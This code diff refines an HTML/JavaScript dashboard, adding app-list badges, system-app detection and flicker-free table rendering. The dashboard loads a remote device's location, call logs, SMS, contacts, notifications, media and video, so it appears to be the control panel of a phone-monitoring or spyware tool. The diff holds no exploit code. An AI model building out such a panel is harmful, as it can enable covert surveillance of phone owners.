@@ -610,7 +610,7 @@
             }
         }
 
-        /* 🔥 NEW: App icon styles */
+        /* 🔥 FIXED: App icon styles */
         .app-icon {
             width: 28px;
             height: 28px;
@@ -619,11 +619,13 @@
             vertical-align: middle;
             object-fit: cover;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: inline-block;
         }
 
         .app-name-container {
             display: flex;
             align-items: center;
+            gap: 8px;
         }
 
         .default-icon {
@@ -636,7 +638,29 @@
             justify-content: center;
             background: #edf2f7;
             color: #4a5568;
-            font-size: 14px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        /* System/User badge styles */
+        .badge-system {
+            background: #f56565;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            font-weight: 500;
+            display: inline-block;
+        }
+
+        .badge-user {
+            background: #48bb78;
+            color: white;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            font-weight: 500;
+            display: inline-block;
         }
     </style>
 </head>
@@ -1026,6 +1050,7 @@
     let ws = null;
     let batteryChart = null;
     let refreshInterval = null;
+    let currentDeviceId = null; // 🔥 FIX: Track current device
 
     // ============= INITIALIZATION =============
     document.addEventListener('DOMContentLoaded', function() {
@@ -1203,35 +1228,34 @@
         showToast(`Device ${deviceId} selected`, 'success');
     }
 
-    // ============= LOAD DEVICE DATA =============
+    // ============= 🔥 FIXED: LOAD DEVICE DATA (NO BLINK) =============
     async function loadDeviceData(deviceId) {
+        // Don't reload if same device
+        if (currentDeviceId === deviceId) {
+            console.log('Same device, skipping reload');
+            return;
+        }
+
+        currentDeviceId = deviceId;
+
         try {
             const response = await fetch(`/api/device/${deviceId}`);
             const data = await response.json();
 
             if (data.success) {
-                console.log('✅ Device data received:', data);
-                console.log('📱 Apps data:', data.data.apps);
-                console.log('📱 Apps count:', data.data.apps ? data.data.apps.length : 0);
+                console.log('✅ Device data received');
 
-                // 🔥 Check if apps have icons
-                if (data.data.apps && data.data.apps.length > 0) {
-                    const withIcons = data.data.apps.filter(app => app.icon).length;
-                    console.log(`📱 Apps with icons: ${withIcons}/${data.data.apps.length}`);
-                }
-
+                // Update all at once - no partial updates
                 updateLocationData(data.data.locations);
                 updateCallsData(data.data.callLogs);
                 updateSmsData(data.data.sms);
                 updateContactsData(data.data.contacts);
-                updateAppsData(data.data.apps); // IMPORTANT: Apps data update with icons
+                updateAppsData(data.data.apps);
                 updateMediaData(data.data.media);
                 updateBatteryData(data.data.battery);
                 updateNetworkData(data.data.network);
                 updateNotificationsData(data.data.notifications);
                 loadVideo(deviceId);
-
-                console.log('✅ All data updated successfully');
             }
         } catch (error) {
             console.error('❌ Error loading device data:', error);
@@ -1404,133 +1428,107 @@
         `).join('');
     }
 
-    // ============= 🔥 FIXED: APPS DATA UPDATE WITH ICONS =============
+    // ============= 🔥 COMPLETELY FIXED: UPDATE APPS DATA (NO BLINK, PROPER LABELS) =============
     function updateAppsData(apps) {
         const tbody = document.getElementById('appsTableBody');
+
+        // Clear first
+        tbody.innerHTML = '';
 
         // SUPER DEBUG
         console.log('🔍 ====== APPS DEBUG START ======');
         console.log('📱 Apps received:', apps);
-        console.log('📱 Type:', typeof apps);
-        console.log('📱 Is Array?', Array.isArray(apps));
 
         // CASE 1: apps is null/undefined
         if (!apps) {
             console.log('❌ apps is null/undefined');
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 30px; color: #f56565;">❌ No apps data (null)</td></tr>';
-            console.log('🔍 ====== APPS DEBUG END ======');
+            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 30px; color: #f56565;">❌ No apps data</td></tr>';
             return;
         }
 
         // CASE 2: apps is NOT an array
         if (!Array.isArray(apps)) {
-            console.log('⚠️ apps is not an array, checking if it has data property...');
-
+            console.log('⚠️ apps is not an array');
             if (apps.data && Array.isArray(apps.data)) {
-                console.log('✅ Found apps.data array with', apps.data.length, 'items');
                 updateAppsData(apps.data);
                 return;
             }
-
             if (apps.apps && Array.isArray(apps.apps)) {
-                console.log('✅ Found apps.apps array with', apps.apps.length, 'items');
                 updateAppsData(apps.apps);
                 return;
             }
-
-            try {
-                const values = Object.values(apps);
-                if (values.length > 0 && typeof values[0] === 'object') {
-                    console.log('✅ Converted object to array with', values.length, 'items');
-                    updateAppsData(values);
-                    return;
-                }
-            } catch (e) {
-                console.log('❌ Object to array conversion failed:', e);
-            }
-
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 30px; color: #f56565;">❌ Invalid apps format</td></tr>';
-            console.log('🔍 ====== APPS DEBUG END ======');
+            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 30px; color: #f56565;">❌ Invalid format</td></tr>';
             return;
         }
 
-        // CASE 3: apps is an empty array
+        // CASE 3: apps is empty
         if (apps.length === 0) {
             console.log('📱 apps array is empty');
             tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; padding: 30px;">📱 No apps installed</td></tr>';
-            console.log('🔍 ====== APPS DEBUG END ======');
             return;
         }
 
-        // CASE 4: SUCCESS - apps is array with data
         console.log(`✅ apps is array with ${apps.length} items`);
-        console.log('📱 First app sample:', apps[0]);
-        console.log('📱 First app keys:', Object.keys(apps[0]));
 
-        // 🔥 Check if first app has icon
-        if (apps[0].icon) {
-            console.log('📱 First app has icon ✅, length:', apps[0].icon.length);
-        } else {
-            console.log('📱 First app has no icon ❌');
-        }
-
-        // Generate table rows with icons
-        let htmlRows = '';
+        // 🔥 Build HTML array (single update)
+        let htmlRows = [];
+        let appsWithIcons = 0;
 
         apps.forEach((app, index) => {
-            // Try multiple property names
+            // Safely get values
             const appName = app.appName || app.name || app.applicationName || app.label || `App ${index+1}`;
             const packageName = app.packageName || app.pkg || app.package || app.pack || app.id || 'N/A';
             const versionName = app.versionName || app.version || app.ver || 'N/A';
             const versionCode = app.versionCode || app.code || '?';
-            const isSystemApp = app.isSystemApp || app.systemApp || app.system || false;
-            const iconBase64 = app.icon || null;
 
-            // Escape HTML for text
-            const safeAppName = escapeHtml(appName);
-            const safePackageName = escapeHtml(packageName);
-            const safeVersionName = escapeHtml(versionName);
+            // 🔥 IMPROVED: System App detection - multiple checks
+            const isSystemApp = (
+                app.isSystemApp === true ||
+                app.systemApp === true ||
+                app.system === true ||
+                (app.flags && (app.flags & 1) === 1) ||
+                String(app.isSystemApp).toLowerCase() === 'true' ||
+                String(app.systemApp).toLowerCase() === 'true' ||
+                String(app.system).toLowerCase() === 'true' ||
+                (app.packageName && app.packageName.startsWith('com.android.')) ||
+                (app.packageName && app.packageName.startsWith('com.google.android.'))
+            );
 
-            // 🔥 ICON HTML - Base64 image ya default icon
+            // Icon HTML with error handling
             let iconHtml = '';
-            if (iconBase64) {
-                iconHtml = `<img src="data:image/png;base64,${iconBase64}" class="app-icon" alt="${safeAppName} icon">`;
-            } else {
-                // Default icon based on app type
-                const iconColor = isSystemApp ? '#f56565' : '#48bb78';
-                const iconChar = isSystemApp ? '⚙️' : '📱';
-                iconHtml = `<span class="default-icon" style="background: ${iconColor}20; color: ${iconColor};">${iconChar}</span>`;
+            if (app.icon && app.icon.length > 50) { // Valid icon check
+                appsWithIcons++;
+                iconHtml = `<img src="data:image/png;base64,${app.icon}"
+                               class="app-icon"
+                               alt="icon"
+                               onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">`;
             }
 
-            htmlRows += `
+            // Default icon (shown if image fails or no icon)
+            const defaultIconHtml = `<span class="default-icon" style="display: ${app.icon ? 'none' : 'flex'};">${isSystemApp ? '⚙️' : '📱'}</span>`;
+
+            // System/User label with proper styling
+            const badgeClass = isSystemApp ? 'badge-system' : 'badge-user';
+            const badgeText = isSystemApp ? '⚙️ System' : '📱 User';
+
+            htmlRows.push(`
                 <tr>
                     <td class="app-name-container">
                         ${iconHtml}
-                        ${safeAppName}
+                        ${defaultIconHtml}
+                        <span>${escapeHtml(appName)}</span>
                     </td>
-                    <td style="font-family: monospace; font-size: 0.9em;">${safePackageName}</td>
-                    <td>${safeVersionName} <span style="color: #999;">(${versionCode})</span></td>
-                    <td>
-                        <span style="
-                            padding: 4px 8px;
-                            border-radius: 4px;
-                            background: ${isSystemApp ? '#f56565' : '#48bb78'};
-                            color: white;
-                            font-size: 0.85em;
-                            font-weight: 500;
-                        ">
-                            ${isSystemApp ? '⚙️ System' : '📱 User'}
-                        </span>
-                    </td>
+                    <td style="font-family: monospace; font-size: 0.9em;">${escapeHtml(packageName)}</td>
+                    <td>${escapeHtml(versionName)} <span style="color: #999;">(${versionCode})</span></td>
+                    <td><span class="${badgeClass}">${badgeText}</span></td>
                 </tr>
-            `;
+            `);
         });
 
-        tbody.innerHTML = htmlRows;
+        // 🔥 SINGLE DOM UPDATE - prevents blinking
+        tbody.innerHTML = htmlRows.join('');
 
-        // 🔥 Count apps with icons
-        const withIcons = apps.filter(app => app.icon).length;
-        console.log(`✅ Apps table updated with ${apps.length} apps (${withIcons} with icons)`);
+        console.log(`✅ Apps table updated: ${apps.length} apps (${appsWithIcons} with icons, ${apps.length - appsWithIcons} fallback)`);
         console.log('🔍 ====== APPS DEBUG END ======');
     }
 
